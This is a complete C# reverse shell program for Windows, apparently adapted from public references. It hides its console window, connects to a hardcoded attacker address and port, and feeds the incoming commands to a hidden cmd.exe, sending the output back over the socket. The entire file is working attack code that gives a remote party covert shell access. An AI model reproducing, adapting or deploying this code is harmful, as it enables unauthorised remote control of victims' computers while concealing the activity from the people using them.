/**
 * reverse shell c# implementation
 * 
 * Ref:
 * https://gist.githubusercontent.com/fdiskyou/56b9a4482eecd8e31a1d72b1acb66fac/raw/1d52bb1f7f3fa080c8b2f01f1d715ea107e518a7/reverse2.cs
 * http://www.codeproject.com/Articles/20250/Reverse-Connection-Shell
 * 
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace RevShellTcp
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int Handle, int showState);

        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        static StreamWriter streamWriter;

        static void Main(string[] args)
        {
            //hide console window, still pops up momentarily
            int win = GetConsoleWindow();
            ShowWindow(win, 0);

            //ip address and port
            //using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
            using (TcpClient client = new TcpClient("192.168.0.34", int.Parse("4444")))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        
                        Process p = new Process();
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.StartInfo.FileName = "cmd.exe"; //cmd.exe or powershell.exe
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        
                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());

                            //exit shell
                            if (strInput.ToString() == "exit")
                            {
                                System.Environment.Exit(1);
                            }

                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                        
                    }
                }
            }
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err){ }
            }
        }
    }
}
